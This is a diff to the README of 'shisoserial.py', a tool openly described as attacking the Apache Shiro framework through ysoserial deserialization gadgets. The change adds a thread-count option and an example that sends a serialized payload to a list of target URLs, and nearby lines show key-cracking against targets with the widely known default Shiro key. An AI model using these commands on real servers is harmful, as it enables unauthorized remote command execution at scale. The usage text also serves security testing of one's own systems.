@@ -32,7 +32,7 @@ python3 -m pip install pycryptodome
 ## Usage
 
 ```
-usage: shisoserial.py [-h] --mode MODE --url  [--type default:CBC] [--data] [--key] [--gadget] [--command default:whoami] [--proxies] [--ser]
+usage: shisoserial.py [-h] --mode MODE --url  [--type default:CBC] [--data] [--key] [--gadget] [--command default:whoami] [--proxies] [--ser] [--thread]
 
 This is a simple tool to attack framework shiro with ysoserial
 
@@ -49,6 +49,7 @@ optional arguments:
                         Specific Execute Command
   --proxies , -p        Specific Proxy
   --ser , -s            Specific serialize file name
+  --thread , -T         Specific the number of threads
 ```
 
 ## Expample
@@ -85,13 +86,13 @@ python3 shisoserial.py -m crack -u target_urls.txt -k kPH+bIxk5D2deZiIxcaaaA== -
 
 ![image-20211229223405240](README.assets/image-20211229223405240.png)
 
-### Use serialize file generate payload
+### Use serialize file send payload with multithreading
 
 ```
-python3 shisoserial.py -m encode -u http://127.0.0.1:8080 -s 1.ser
+python3 shisoserial.py -m encode -u target_urls.txt -t cbc -s 1.ser -T 4
 ```
 
-![](README.assets/image-20211229175637985.png)
+![image-20211230181021173](README.assets/image-20211230181021173.png)
 
 ## Disclaimer
 
